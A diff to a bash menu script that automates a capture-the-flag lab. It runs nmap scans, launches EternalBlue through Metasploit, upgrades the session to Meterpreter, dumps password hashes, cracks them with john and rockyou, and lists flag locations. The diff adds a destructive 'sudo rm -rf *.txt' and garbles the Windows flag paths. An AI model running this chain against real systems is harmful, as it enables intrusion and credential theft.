@@ -153,7 +153,7 @@ show_tasks() {
     sleep 0.4
     echo -e "\033[1;32m7️⃣  Dump password hashes and crack them\033[0m"
     sleep 0.4
-    echo -e "\033[1;32m8️⃣  Find and read the hidden flags 🏁\033[0m"
+    echo -e "\033[1;32m8️⃣  Find and read the hidden flags \033[0m"
     sleep 1
     echo -e "\033[1;36m=============================================\033[0m"
     read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
@@ -179,7 +179,7 @@ echo
     sleep 1
 echo -e "\033[1;36m============================================================\033[0m"
 sleep 0.5
-  read -p "[*] Press Enter to return to the menu..."
+  read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
 echo -e "\033[1;36m============================================================\033[0m"
 sleep 1
   
@@ -187,6 +187,7 @@ sleep 1
 exploit_lab() {
     echo "[i] Cleaning up old VPN connections..."
     sudo pkill openvpn
+    sudo rm -rf *.txt
     sleep 2
 sleep 0.5
  echo
@@ -219,6 +220,15 @@ sleep 1
     read -p "[?] Enter Listening Port (LPORT, default 4444): " lport
     echo
     lport=${lport:-4444}
+      echo -e "\033[1;32m8️⃣ Running Nmap (basic scan)... \033[0m"
+    nmap -sS -sV -O -Pn "$rhost" -oN initial_scan.txt
+    
+    echo -e "\033[1;32m8️⃣ Running Nmap (vuln scripts).. \033[0m"
+     nmap -sV --script vuln "$rhost" -oN vuln_scan.txt
+     
+    echo -e "\033[1;33Scan complete. Saved to initial_scan.txt and vuln_scan.txt"\033[0m"
+    
+      read -p $'\033[1;33m[*] Press Enter to launch EternalBlue exploit....\033[0m'
 
         echo -e "\n\033[1;33m🚀 Launching EternalBlue Exploit...\033[0m"
 sleep 1
@@ -233,21 +243,39 @@ sleep 1
 # Manual commands to display
 echo -e "\033[1;35m📌 STEP 1: In your msfconsole, type:\033[0m"
 sleep 0.5
+echo -e "\033[1;34msessions\033[0m"
+sleep 0.5
+echo -e "\033[1;34m(Remember the Session ID)\033[0m"
+sleep 0.5
 echo -e "\033[1;34muse post/multi/manage/shell_to_meterpreter\033[0m"
 sleep 0.3
 echo -e "\033[1;34mset SESSION <session_id>\033[0m"
 sleep 0.3
-echo -e "\033[1;34mexploit -j\033[0m"
+echo -e "\033[1;34mexploit or run\033[0m"
 sleep 1
 
 echo -e "\n\033[1;35m📌 STEP 2: After Meterpreter is active:\033[0m"
 sleep 0.5
+echo -e "\033[1;34msessions\033[0m"
+sleep 0.4
 echo -e "\033[1;34msessions -i <session_id>\033[0m"
 sleep 0.3
 echo -e "\033[1;34msysinfo\033[0m"
 sleep 0.3
 echo -e "\033[1;34mhashdump\033[0m"
 sleep 1
+
+echo -e "\n\033[1;35m📌 STEP 3: Find the Flags:\033[0m"
+sleep 0.5
+echo -e   "\033[1;34msearch -f flag*.txt\033[0m"
+
+echo -e "\n\033[1;35m📌 STEP 4: Crack the Password:\033[0m"
+sleep 0.5
+echo -e   "\033[1;34mSimply go to this Website(under this) or type Exit -y for use (JOHN)\033[0m"
+sleep 0.5
+echo -e   "\033[1;34mhttps://crackstation.net/\033[0m"
+sleep 0.5
+
 
 echo -e "\033[1;36m------------------------------------------------------------\033[0m"
 echo -e "\033[1;33m⚠️  Replace \033[1;31m<session_id>\033[0m \033[1;33mwith the correct ID shown by 'sessions'\033[0m"
@@ -265,10 +293,10 @@ exploit -j;
     echo "$hash" > hash1.txt
 
     echo "[*] Cracking with rockyou.txt..."
-    john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt
+    john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
     john --show hash1.txt
-
-    echo -e "\n[✓] Done. Use 'sessions -i <ID>' to reattach anytime."
+    sleep 5
+    read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
 }
 
 # 📖 Lab Q&A section
@@ -318,13 +346,13 @@ sleep 0.5
     echo -e "\n\033[1;34m🧩 Task 5: Capture the Flags\033[0m"
      sleep 0.2
     echo -e "🔹 \033[1;36mFlag1 Location:\033[0m"
-    echo -e "➡️  \033[1;32mC:\\flag1.txt\033[0m"
+    echo -e "➡️  \033[1;32mC:flag1.txt\033[0m"
      sleep 0.2
     echo -e "🔹 \033[1;36mFlag2 Location:\033[0m"
-    echo -e "➡️  \033[1;32mC:\\Windows\\System32\\config\\flag2.txt\033[0m"
+    echo -e "➡️  \033[1;32mC:Windows:System32:config:flag2.txt\033[0m"
      sleep 0.2
     echo -e "🔹 \033[1;36mFlag3 Location:\033[0m"
-    echo -e "➡️  \033[1;32mC:\\Users\\Administrator\\Documents\\flag3.txt\033[0m"
+    echo -e "➡️  \033[1;32mC:Users:Administrator:Documents:flag3.txt\033[0m"
 sleep 0.5
     echo -e "\n\033[1;36m====================================================\033[0m"
     read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
